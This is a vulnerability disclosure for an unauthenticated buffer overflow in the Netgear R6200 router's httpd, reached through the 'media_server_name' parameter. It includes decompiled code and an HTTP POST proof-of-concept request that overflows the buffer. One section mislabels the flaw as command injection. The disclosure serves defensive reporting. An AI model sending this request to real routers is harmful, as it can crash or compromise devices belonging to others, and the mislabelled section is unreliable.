# Buffer Overflow Vulnerability in `UpnpMediaCgiMain`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | Netgear R6200 Router                                         |
| Firmware Version     | V1.0.1.58_1.0.44                                             |
| Vulnerability Type   | **Buffer Overflow**                                          |
| Vulnerable Component | `httpd` (`UpnpMediaCgiMain` â†’ `sub_496C80`) (data flow via `media_server_name`) |
| Prerequisites        | No authentication required; attacker must supply crafted input via web interface parameter `media_server_name` |

2. Exploitation Path

```c
int __fastcall UpnpMediaCgiMain(char *a1, int a2)
{
  _BYTE v5[128]; // [sp+18h] [-280h] BYREF
  char v6[256]; // [sp+98h] [-200h] BYREF
  char v7[256]; // [sp+198h] [-100h] BYREF
  ...
  websGetVar(a1, "media_server_name", v6);
  if ( !strchr(v6, 58) )
  {
    sub_496C80(v7);
    strcat(v6, v7);
  }
  ...
}

int __fastcall sub_496C80(char *a1)
{
  char v3[256]; // [sp+18h] [-100h] BYREF

  memset(v3, 0, sizeof(v3));
  if ( acosNvramConfig_match("board_id", "U12H127T00_NETGEAR") )
  {
    strcpy(v3, "WNR3500v2");
  }
  else if ( acosNvramConfig_match("board_id", "U12H127T70_NETGEAR") )
  {
    strcpy(v3, "WNR3500v2 VCNA");
  }
  else
  {
    strcpy(v3, "R6200");
  }
  return sprintf(a1, ": %s", v3);
}
```

3. **Vulnerable Binaries:** The vulnerability resides in the `httpd` binary.

4. 0-Day Command Injection Exploitation Path: In the `httpd` binary, the `UpnpMediaCgiMain` function at line 7 calls `websGetVar(a1, "media_server_name", v6)` to receive input. Although a 255-byte length restriction is enforced, no additional validation is performed. At line 10, the function `sub_496C80(v7)` generates a string `v7`, which may be `": WNR3500v2"`, `": WNR3500v2 VCNA"`, or `": R6200"`. This string is then concatenated to `v6` via `strcat(v6, v7)` at line 11, resulting in a buffer overflow vulnerability.

5. Proof of Concept (PoC) for Reproducing the Vulnerability

```http
POST /cgi-bin/UpnpMediaCgiMain HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 300
Connection: close

media_server_name=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```